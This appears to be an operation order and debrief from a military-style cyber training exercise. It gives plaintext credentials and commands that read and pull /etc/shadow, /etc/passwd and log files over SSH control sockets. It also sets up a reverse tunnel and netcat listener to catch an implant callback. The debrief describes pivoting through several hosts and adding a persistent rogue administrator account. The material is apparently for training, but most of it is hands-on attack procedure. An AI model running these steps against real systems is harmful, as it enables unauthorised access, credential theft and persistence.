Start Time: 0900
Duration: 6 hours

Credentials: engineer#::enshallah // caisson#::tread_depth // NOC_Admin#::5gftE8DCc8 // user#::P455w0rd //

Tools/Techniques: 

All connections will be established through SSH masquerades or via implant. 

Ports in use will be dependent on target location and are subject to change. 

All scanning must be conducted through secure tunnels. 

Nmap and traceroute command(s) are authorized but unreliable and known to produce false positives. 

Netsh tunnels are authorized for use on target 5 for the duration of the connection to target 6. Secure Copy (scp) is the preferred method for file transfers <10MB. 

All secure hash functions are authorized with the exception of SHA-0 algorithm.

Analysts on operation will make analytical judgment based off their target knowledge when providing credentials to test.

Only three sets of credentials can be tested per target.

Action: Perform SSH masquerade with credentials successful in previous operation. Conduct @@device survey@@ if not conducted during previous operation. Collect any files of interest. Maneuver to the next target by catching call-back from T5 (see T5 target section for implant information).

##ASK EA to collect or not##
FILE HASH CHECK
FILE SIZE Check
COLLECT
SEND HASH to EA

sudo md5sum /etc/shadow
md5sum /etc/passwd
md5sum /etc/group
sudo md5sum /var/log/lynis.log
sudo ls -la --block-size=M  /etc/shadow
ls -la --block-size=M  /etc/passwd

sudo ls -la --block-size=M  /var/log/lynis.log
sudo ls -latr /var/log/lynis.log

sudo cat /etc/shadow
cat /etc/passwd
cat /etc/group
sudo cat /var/log/lynis.log

ssh -S /tmp/T4 bad "sudo cat /var/log/lynis.log" > lynis.log

##ask permission to catch a call back##
catch a callback
 
ssh -S /tmp/T4 bad -O forward -R192.168.169.43:8004:localhost:8004
Let the Analyst know when you are ready to catch the Call-Back.
nc -nlvp 8004

*Note* T10implant.exe will call-back to T4/Admin1 on port <8000 + Student#> {i.e. Student8 will use port 8008 or Student12 will use 8012}. This should be redirected back to your Ops Station through secure tunnels. Let the Analyst know when you are ready to catch the Call-Back. Your implant does not require a malware report.

DEBRIEF 

Operator: 1LT An

Operation: ANGRYAARDVARK03

MC: mc1

Analyst: analyst1

Description: ANGRYAARDVARK is a C-ISR mission profile. On T1, we redirected to T2. On T2, we redirected to T3. On T3, we redirected to T4. On T4, we collected files related to user information and we were able to catch a callback from an implant on T5. Once we got the callback, we had T5. On T5, we did not collect any files but we setup a netsh portproxy to masquerade to T6. On T6, we performed a survey and recorded all available user information on that device. We disconnected from T6 and T5 to get to T7. We ssh masquerade to T7 and we performed a survey. We also recorded user information on the device. After confirming T7 is USER13, we conducted an effect by adding a new administrator user, named "user34". Once we verified that user is persistent, we concluded the operations.
